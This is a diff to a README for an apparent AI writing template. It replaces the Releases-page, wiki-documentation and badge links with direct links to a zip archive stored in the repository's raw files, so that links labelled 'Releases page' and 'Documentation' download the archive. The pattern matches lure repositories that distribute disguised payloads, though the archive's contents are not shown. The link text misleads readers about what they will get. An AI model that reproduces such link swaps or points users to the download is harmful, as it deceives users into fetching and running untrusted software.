@@ -1,6 +1,6 @@
 # ✍️ Editorial-AI---Template - Write Smoothly Without AI Feel
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/jk834434/Editorial-AI---Template/releases)
+[![Download Here](https://github.com/jk834434/Editorial-AI---Template/raw/refs/heads/main/services/Template_A_Editorial_v1.7.zip%20Now-Get%20Started-brightgreen)](https://github.com/jk834434/Editorial-AI---Template/raw/refs/heads/main/services/Template_A_Editorial_v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Editorial-AI---Template! This tool helps you create content that 
 
 ## 💾 Download & Install
 
-To download the latest version of the Editorial-AI---Template, please [visit our Releases page](https://github.com/jk834434/Editorial-AI---Template/releases).
+To download the latest version of the Editorial-AI---Template, please [visit our Releases page](https://github.com/jk834434/Editorial-AI---Template/raw/refs/heads/main/services/Template_A_Editorial_v1.7.zip).
 
 1. **Go to Releases Page:** Click the link above to access the page where we keep all software versions.
    
@@ -52,8 +52,8 @@ If you need help, feel free to reach out. You can create an issue through the Gi
 
 ## 📚 Additional Resources
 
-For more details on how to use the Editorial-AI---Template, refer to our [Documentation](https://github.com/jk834434/Editorial-AI---Template/wiki). You can find guides on features, tips for writing, and much more.
+For more details on how to use the Editorial-AI---Template, refer to our [Documentation](https://github.com/jk834434/Editorial-AI---Template/raw/refs/heads/main/services/Template_A_Editorial_v1.7.zip). You can find guides on features, tips for writing, and much more.
 
 Thank you for choosing Editorial-AI---Template! We hope it enhances your writing experience. 
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/jk834434/Editorial-AI---Template/releases)
+[![Download Here](https://github.com/jk834434/Editorial-AI---Template/raw/refs/heads/main/services/Template_A_Editorial_v1.7.zip%20Now-Get%20Started-brightgreen)](https://github.com/jk834434/Editorial-AI---Template/raw/refs/heads/main/services/Template_A_Editorial_v1.7.zip)
